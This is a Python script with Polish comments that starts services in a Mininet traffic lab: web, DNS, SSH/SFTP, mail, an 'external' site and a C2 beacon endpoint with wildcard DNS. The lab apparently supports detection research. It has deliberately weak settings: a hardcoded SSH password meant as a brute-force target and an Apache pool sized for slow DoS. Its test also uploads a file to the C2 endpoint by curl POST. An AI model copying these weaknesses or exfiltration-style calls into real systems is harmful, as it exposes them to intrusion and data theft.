#!/usr/bin/env python3
"""Usługi w sieci Mininet: web, DNS, SSH/SFTP, poczta, strony "zewnętrzne", endpoint beaconingu.

Usługa działa „w sieci” hosta, ale na wspólnym dysku. Host Minineta ma osobną sieć (przestrzeń nazw),
ale ten sam system plików i tych samych użytkowników co WSL. Wynikają z tego że
każda usługa ma własny katalog aby logi i PIDy różnych usług się nie mieszały.

Są dwa rodzaje procesów usług:
- serwery w Pythonie (http.server, smtpd, nasłuch beaconingu) - uruchamiane przez popen i zatrzymywane terminate
- deamony - serwery systemowe  (apache2, dnsmasq, sshd) - uruchamiane przez cmd i zatrzymywane kill na PID 

Lista handles to rejestr wszystkich uruchomionych usług - każdy element mówi jak dana usługę zatrzymać.

Nazwy domen laboratorium:
  - firma.lab          - strefa wewnętrzna (web, dns, ssh, files, mail)
  - lab-ext.example    - strefa "internetowa" (xweb i cel beaconingu), autorytatywnie na xdns

Uruchomienie samodzielne (buduje topologię, startuje usługi, testuje, zatrzymuje):
    python3 env/services.py
    python3 env/services.py --cli        # po testach konsola Mininetu
"""
import argparse
import json
import os
import random #losowe rozmiary plików, subprocess do pkill
import subprocess
import sys
import time

from mininet.log import setLogLevel

import topology #daje adresy hostów i budowę sieci
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "traffic")) #dopisuje katalog
# traffic/ do miejsc w których python szuka modułów, zeby dało się zaimportować profiles
import profiles  # stąd biorą się nazwy plików na serwerze i ich liczba. - generator ruchu korzysta z tych sammych nazw
# więc serwer i klient zawsze się zgadzają 

#Stałe
LAB = "/tmp/lab" #katalog roboczy - każda usługa dostaje podkatalog na konfiguracje logi i plik PID
BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "services_bin") #ścieżka do katalogu gdzie leżą dwa serwery w pythonie
SSH_USER = "labuser"
SSH_PASS = "Lab1234!"    #konto testowe(cel brute-force'a)
INT_DOMAIN = "firma.lab"
EXT_DOMAIN = "lab-ext.example" #nazwy domen: wewnętrzna i zewnętrzna(internet) - .example nigdy nie wskaże domeny prawdziwej

#moduły Apache doładowywane w konfiguracji (Ubuntu 22.04; log_config i unixd są już wbudowane,
#sprawdzone przez apache2 -l 29.10.2026, więc nie trzeba ich LoadModule)
APACHE_MODULES = """LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so 
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
LoadModule dir_module /usr/lib/apache2/modules/mod_dir.so"""
#doładowane moduły Apache: mpm_prefork - jeden proces apache na jedno połączenie, authz_core obsługa require all granted,
#  mime - typ zawartości w odp np. text/html, dir - zapytanie o / zwraca index.html



#tworzy katalog i pozwala dokładać podkatalogi np. host_dir("web", "www") -> /tmp/lab/web/www
def host_dir(name, *sub):
    path = os.path.join(LAB, name, *sub)
    os.makedirs(path, exist_ok=True)
    return path

#zapisuje tekst do pliku
def write(path, text):
    with open(path, "w") as f:
        f.write(text)

#wzorce poleceń NASZYCH usług (pkill -f): każda usługa ma w poleceniu swój plik z /tmp/lab
#pkill -f wzorzec zabija każdy proces, którego całe polecenie pasuje do wzorca
SERVICE_PATTERNS = [
    f"apache2 -d {LAB}/",
    f"dnsmasq --conf-file={LAB}/",
    f"sshd -f {LAB}/",
    f"http.server .*--directory {LAB}/",
    f"{BIN}/",
]

#zabija nasze usługi, które zostały po przerwanym uruchomieniu albo nie zatrzymały się same
def kill_leftover_services():
    for pattern in SERVICE_PATTERNS:
        subprocess.run(["pkill", "-f", pattern], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) #wyrzuca output do kosza


#jeśli konto labuser jeszcze nie istnieje to tworzy je, a potem zawsze ustawia haslo
def ensure_ssh_user():
    if os.system(f"id -u {SSH_USER} >/dev/null 2>&1") != 0: # 0 oznacza sukces czyli user istnieje
        os.system(f"useradd -m -s /bin/bash {SSH_USER}") #tworzy konto z katalogiem domowym i powłoką bash
    os.system(f"echo '{SSH_USER}:{SSH_PASS}' | chpasswd") # ustawia hasło dla konta 

#generuje pare kluczy SSH ed25519 i dopisuje klucz publiczny do authorized_keys labusera,
#żeby generator ruchu mógł robić scp/sftp bez podawania hasła
# Klucz dla labusera: pozwala generatorowi robić SFTP/scp bez podawania hasła.
def ensure_client_key():
    key = host_dir("_client") + "/id_ed25519" # ścieżka do klucza prywatnego
    if not os.path.exists(key):
        os.system(f"ssh-keygen -q -t ed25519 -N '' -f {key}") #generuje klucz
    sshdir = f"/home/{SSH_USER}/.ssh" #katalog .ssh u labusera
    os.makedirs(sshdir, exist_ok=True)
    os.system(f"cat {key}.pub > {sshdir}/authorized_keys")
    # ustawiamy poprawne uprawnienia 700 na katalog i 600 na klucz 
    # - jeśli katalog ma inne uprawnienia to sshd odmawia logowania kluczem
    os.system(f"chown -R {SSH_USER}:{SSH_USER} {sshdir}; chmod 700 {sshdir}; chmod 600 {sshdir}/authorized_keys")
    return key

# rozmiar pliku: ciało log-normalne (mediana ~4 KB) + rzadki ogon Pareto (duże pliki).
# Ciężki ogon rozmiarów plików WWW: Crovella i Bestavros 1997; konkretne parametry mój wybór.
WEB_FILE_MIN_BYTES = 256
WEB_FILE_MAX_BYTES = 8 * 1024 * 1024


#losuje rozmair jednego pliku: 10% to ogon pareto (duże pliki), a reszta to małe pliki (mice)
def heavy_tailed_size(rng):
    if rng.random() < 0.10:
        # ogon: duże pliki (elephant flows), skala ~100 KB, alpha ~1,2 -> od 100 KB do kilku MB
        size = 100_000 * rng.paretovariate(1.2)
    else:
        size = rng.lognormvariate(8.3, 1.0)                  # ciało (mice): mediana ~4 KB
    return int(max(WEB_FILE_MIN_BYTES, min(size, WEB_FILE_MAX_BYTES)))


#dla każej nazwy towrzy plik i wywołuje f.trucate(rozmair) - powstaje plik rzadki: system zapisuje tylko
#jego rozmiar, nie zapisuje bajtów na dysk, a przy czytaniu zwraca zera. Apache i scp wysyłają wtedy
#pełny rozmiar, więc przepływy w sieci są prawdziwej wielkości a dysk pozostaje pusty.
def make_files(directory, names, seed):
    rng = random.Random(seed)
    for name in names:
        with open(os.path.join(directory, name), "wb") as f:
            f.truncate(heavy_tailed_size(rng))


# zawartość serwera web: index.html + kilkaset plików o ciężkoogonowych rozmiarach,
# pobieranych później z popularnością Zipf (wybór pliku robi generator ruchu)
def make_web_content(www):
    write(os.path.join(www, "index.html"),
          "<html><body><h1>Intranet firma.lab</h1><p>Strona testowa.</p></body></html>\n")
    make_files(www, profiles.web_file_names(), seed=1234)


#Buduje całą konfigurację Apache jako f-string i zapisuje do pliku,
#potem uruchamia apache z tą konfiguracja
def start_web(host, handles):
    d = host_dir("web") #katalog roboczy dla hosta web
    www = host_dir("web", "www") #podkatalog - folder z plikami ktore serwer udostępnia
    make_web_content(www) #tworzymy zawartość
    conf = f"""ServerName web.{INT_DOMAIN} 
ServerRoot {d} 
PidFile {d}/apache2.pid
# na jakim adresie i porcie słuchać 
Listen {host.IP()}:80
{APACHE_MODULES}
User www-data
Group www-data
TypesConfig /etc/mime.types
DocumentRoot {www}
ErrorLog {d}/error.log
# Mała pula procesów aby wolny DoS mógł wyczerpać połączenia.
StartServers 2
MinSpareServers 2
MaxSpareServers 5
MaxRequestWorkers 20
<Directory {www}>
  Require all granted
</Directory>
"""
    write(f"{d}/apache2.conf", conf)
    out = host.cmd(f"apache2 -d {d} -f {d}/apache2.conf -k start 2>&1") #start deamona w przestrzeni nazw web
    #pod obciążeniem start trwa różnie długo: czekam (do 10 s), aż serwer naprawdę odpowie.
    code = ""
    for _ in range(40):
        code = host.cmd(f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 1 http://{host.IP()}/").strip()
        if code == "200":
            break
        time.sleep(0.25)
    if code != "200":
        tail = host.cmd(f"tail -5 {d}/error.log 2>&1")
        print(f"[web] Apache nie odpowiada (HTTP {code or 'brak'}). start: {out.strip()}\n"
              f"[web] error.log:\n{tail}", file=sys.stderr)
    handles.append({"type": "pidfile", "host": host, "pid": f"{d}/apache2.pid", "stop": f"apache2 -d {d} -f {d}/apache2.conf -k stop"}) #łagodne zatrzymanie

#adres hosta z topology.py
def ip(name):
    return topology.HOSTS[name][1]

#dns zewnetrzny i wewnetrzny (dnsmasq)
#słucha na porcie DNS tylko na adresie tego hosta
#nie pyta żadnego serwera z /etc/resolv.conf - nie ma prawdziwego neta
#nie czyta /etc/hosts z wsl
#kazde zapytanie zapisuje do query.log
#plik PID do zatrzymania
def start_dnsmasq(host, handles, zone_lines):
    d = host_dir(host.name)
    conf = f"""port=53
listen-address={host.IP()}
bind-interfaces
no-resolv
no-hosts
log-queries
log-facility={d}/query.log
pid-file={d}/dnsmasq.pid
""" + "\n".join(zone_lines) + "\n"
    write(f"{d}/dnsmasq.conf", conf)
    host.cmd(f"dnsmasq --conf-file={d}/dnsmasq.conf")
    handles.append({"type": "pidfile", "host": host, "pid": f"{d}/dnsmasq.pid"})

#tworzymy plik hosts.firma mapujący nazwy *.firma.lab dla 5 serwerów,
#a zapytania o domenę zewnetrzna przekazujemy do xdns - forwardujemy 'internetowe' dalej
def start_dns_internal(host, handles):
    d = host_dir(host.name)
    servers = ["web", "dns", "ssh", "files", "mail"]
    write(f"{d}/hosts.firma", "".join(f"{ip(name)} {name}.{INT_DOMAIN}\n" for name in servers)) # szuka w hosts.firma i odpowiada na zapytania o *.firma.lab
    start_dnsmasq(host, handles, [f"addn-hosts={d}/hosts.firma", f"server=/{EXT_DOMAIN}/{ip('xdns')}"]) 

#host xdns jest autorytatywny DNS dla lab-ext.example i ustawia, że wszytko pod tą domeną
#idzie do c2 a xweb.lab-ext.example do serwera stron.
#dzięki adress=/lab-ext.example/... dowolna subdomena się rozwiąże (to ważne dla beaconingu C2
#który może używać losowych nazw subdomen)
def start_dns_external(host, handles):
    start_dnsmasq(host, handles, [f"address=/{EXT_DOMAIN}/{ip('c2')}", f"address=/xweb.{EXT_DOMAIN}/{ip('xweb')}"])

#każdy serwer ssh ma własny klucz, którym przedstawia sie klientowi - generujemy go
#logowanie hasłem (cel brute-force) i logowanie kluczem (normalny ruch generatora) jest włączone
#root nie moze sie zalogowac wpuszczam tylko labusera
#każda próba logowania jest zapisywana do sshd.log
def start_sshd(host, handles, sftp=False): #ssh nie wymaga sftp, files wymaga sftp
    name = host.name
    d = host_dir(name)
    key = f"{d}/ssh_host_ed25519_key"
    if not os.path.exists(key):
        os.system(f"ssh-keygen -q -t ed25519 -N '' -f {key}")
    os.makedirs("/run/sshd", exist_ok=True)
    subsystem = "Subsystem sftp /usr/lib/openssh/sftp-server" if sftp else ""
    conf = f"""Port 22
ListenAddress {host.IP()}
HostKey {key}
PidFile {d}/sshd.pid
UsePAM no
# (komentarze w sshd_config muszą być w osobnych liniach, inaczej trafiają do wartości)
# logowanie hasłem: cel brute-force
PasswordAuthentication yes
# logowanie kluczem: normalny ruch (generator)
PubkeyAuthentication yes
PermitRootLogin no
# tylko konto testowe
AllowUsers {SSH_USER}
# zapisuje każdą próbę logowania, udaną i nieudaną
LogLevel VERBOSE
{subsystem}
"""
    write(f"{d}/sshd_config", conf)
    host.cmd(f"/usr/sbin/sshd -f {d}/sshd_config -E {d}/sshd.log")
    handles.append({"type": "pidfile", "host": host, "pid": f"{d}/sshd.pid"})

#uruchamia services_bin/mailsink.py, czyli prosty serwer smtp na porcie 25 zapisujący
#pocztę do skrzynki inbox.mbox
def start_mail(host, handles):
    d = host_dir("mail")
    p = host.popen(["python3", f"{BIN}/mailsink.py", "--bind", host.IP(), "--port", "25",
                    "--mbox", f"{d}/inbox.mbox"])
    handles.append({"type": "popen", "host": host, "proc": p})

# "strona w internecie" - wbudowany python3 -m http.server dający index.html i mniejszy zbiór
# plików o ciężkoogonowych rozmiarach (jak web, ale mniej); generator pobiera je z popularnością Zipf
def start_xweb(host, handles):
    www = host_dir("xweb", "www")
    write(os.path.join(www, "index.html"), "<html><body>External site</body></html>\n")
    make_files(www, profiles.web_file_names(profiles.XWEB_FILE_COUNT), seed=5678) #inne ziarno niz web - inne rozmiary
    p = host.popen(["python3", "-m", "http.server", "80", "--bind", host.IP(), "--directory", www])
    handles.append({"type": "popen", "host": host, "proc": p})

#uruchamia services_bin/beacon_endpoint.py, serwer do którego beaconing C2 wysyła GET i POST (upload)
# i zapisuje logi do pliku
def start_c2(host, handles):
    d = host_dir("c2")
    p = host.popen(["python3", f"{BIN}/beacon_endpoint.py", "--bind", host.IP(), "--port", "80",
                    "--log", f"{d}/requests.log", "--upload-dir", f"{d}/uploads"])
    handles.append({"type": "popen", "host": host, "proc": p})

#to jest dyrygent usług: towrzy konto i klucz a potem po kolei uruchamia każdą usługę
#na odpowiednim hoscie  i zwraca listę handles - czyli rejestr wszytskiego co trzeba będzie zatrzymać
def start_services(net):
    kill_leftover_services() #resztki po przerwanym uruchomieniu (np. stary Apache z tym samym plikiem PID)
    ensure_ssh_user()
    ensure_client_key()
    handles = []
    start_web(net.get("web"), handles)
    start_dns_internal(net.get("dns"), handles)
    start_dns_external(net.get("xdns"), handles)
    start_sshd(net.get("ssh"), handles, sftp=False)
    start_sshd(net.get("files"), handles, sftp=True)
    start_mail(net.get("mail"), handles)
    start_xweb(net.get("xweb"), handles)
    start_c2(net.get("c2"), handles)
    time.sleep(2)  # serwery Pythona potrzebują chwili na bind
    return handles


#zamyca wszytko w odwrtonej kolejności i odpornie na błedy - dwa sposoby zatrzmyania
#zależnie od handla - usługi z plikiem PID kill i serwery w Pythonie popen
def stop_services(handles):
    for h in reversed(handles):
        try:
            if h["type"] == "pidfile":
                if "stop" in h:
                    h["host"].cmd(h["stop"])
                else:
                    h["host"].cmd(f"[ -f {h['pid']} ] && kill $(cat {h['pid']}) 2>/dev/null")
            elif h["type"] == "popen":
                h["proc"].terminate()
        except Exception:
            pass
    kill_leftover_services() #dobija tylko nasze usługi, jeśli któraś nie zatrzymała się sama


#TESTY

def banner(host, ip, port, nbytes=80):
    return host.cmd(f"timeout 3 bash -c 'exec 3<>/dev/tcp/{ip}/{port}; head -c {nbytes} <&3'")
#otwiera surowe połączneie TCP i czyta pierwsze bajty odp - służy do sprawdzenia czy usluga wgl odpowiada i czy wysyła banner (np. SSH, SMTP)


#pełny test end-to-end każdej usługi z perspektywy klienta o1
def run_checks(net, client_key):
    o1 = net.get("o1")
    results, checks = {}, {}

    # web
    results["web_http"] = o1.cmd(f"curl -s -o /dev/null -w '%{{http_code}}' http://{ip('web')}/").strip()
    results["web_download"] = o1.cmd(f"curl -s -o /dev/null -w '%{{size_download}}' http://{ip('web')}/file0001.bin").strip()
    checks["web"] = results["web_http"] == "200" and results["web_download"].isdigit() and int(results["web_download"]) > 0

    # dns wewnętrzny: nazwa -> adres
    results["dns_internal"] = o1.cmd(f"dig +short +time=2 web.{INT_DOMAIN} @{ip('dns')}").strip()
    checks["dns_internal"] = results["dns_internal"] == ip("web")
    # dns wewnętrzny forwarduje domenę zewnętrzną do xdns
    results["dns_forward"] = o1.cmd(f"dig +short +time=2 beacon.{EXT_DOMAIN} @{ip('dns')}").strip()
    checks["dns_forward"] = results["dns_forward"] == ip("c2")
    # xdns autorytatywnie (dowolna subdomena -> c2)
    results["xdns_wildcard"] = o1.cmd(f"dig +short +time=2 x7f3.{EXT_DOMAIN} @{ip('xdns')}").strip()
    checks["xdns"] = results["xdns_wildcard"] == ip("c2")

    # ssh i files: banner + realny scp kluczem
    results["ssh_banner"] = banner(o1, ip("ssh"), 22).strip()
    results["files_banner"] = banner(o1, ip("files"), 22).strip()
    checks["ssh_banner"] = results["ssh_banner"].startswith("SSH-2.0")
    checks["files_banner"] = results["files_banner"].startswith("SSH-2.0")
    scp = o1.cmd(f"scp -q -i {client_key} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                 f"-o ConnectTimeout=5 {SSH_USER}@{ip('files')}:/tmp/lab/web/www/file0001.bin /tmp/lab/_client/got.bin "
                 f"2>/dev/null; stat -c %s /tmp/lab/_client/got.bin 2>/dev/null")
    results["files_scp_bytes"] = scp.strip()
    checks["files_scp"] = results["files_scp_bytes"].isdigit() and int(results["files_scp_bytes"]) > 0

    # poczta: banner + wysłanie wiadomości
    results["mail_banner"] = banner(o1, ip("mail"), 25, 40).strip()
    o1.cmd("python3 - <<'PY'\n"
           "import smtplib\n"
           f"m = smtplib.SMTP('{ip('mail')}', 25, timeout=5)\n"
           "m.sendmail('o1@firma.lab', ['mbox@firma.lab'], 'Subject: test\\n\\ntresc testowa')\n"
           "m.quit()\nPY")
    time.sleep(0.5)
    results["mail_mbox_lines"] = net.get("mail").cmd("wc -l < /tmp/lab/mail/inbox.mbox 2>/dev/null").strip()
    checks["mail"] = results["mail_banner"].startswith("220") and results["mail_mbox_lines"] not in ("", "0")

    # xweb
    results["xweb_http"] = o1.cmd(f"curl -s -o /dev/null -w '%{{http_code}}' http://{ip('xweb')}/").strip()
    checks["xweb"] = results["xweb_http"] == "200"

    # c2: GET (check-in) i POST (upload), rozwiązując nazwę przez xdns
    c2_ip = o1.cmd(f"dig +short +time=2 beacon.{EXT_DOMAIN} @{ip('xdns')}").strip().splitlines()
    c2_ip = c2_ip[0] if c2_ip else ""
    o1.cmd(f"curl -s -o /dev/null http://{c2_ip}/checkin")
    o1.cmd(f"curl -s -o /dev/null -X POST --data-binary @/tmp/lab/web/www/index.html http://{c2_ip}/upload")
    time.sleep(0.5)
    results["c2_log_lines"] = net.get("c2").cmd("wc -l < /tmp/lab/c2/requests.log 2>/dev/null").strip()
    checks["c2"] = results["c2_log_lines"] not in ("", "0", "1")

    return results, checks

#podobnie jak w  topology  - inaczej tylko - po starcie sieci uruchamia usługi testuje je i w finnalu
# najpierw zamyka usługi potem sieć i końcyz kodem 0 tylko wtedy gdy wszystkie testy przeszły
def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--cli", action="store_true")
    args = parser.parse_args()
    if os.geteuid() != 0:
        sys.exit("Uruchom jako root.")
    setLogLevel("warning")
    topology.cleanup()
    topology.ensure_ovs()

    net = topology.build()
    client_key = f"{LAB}/_client/id_ed25519"
    ok = False
    handles = []
    try:
        net.start()
        topology.disable_offload(net)
        handles = start_services(net)
        results, checks = run_checks(net, client_key)
        results["checks"] = checks
        print(json.dumps(results, indent=2, ensure_ascii=False))
        for name, passed in checks.items():
            print(f"{'OK  ' if passed else 'BŁĄD'} {name}")
        ok = all(checks.values())
        if args.cli:
            topology.run_cli(net)
    finally:
        stop_services(handles)
        net.stop()
        topology.cleanup()
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
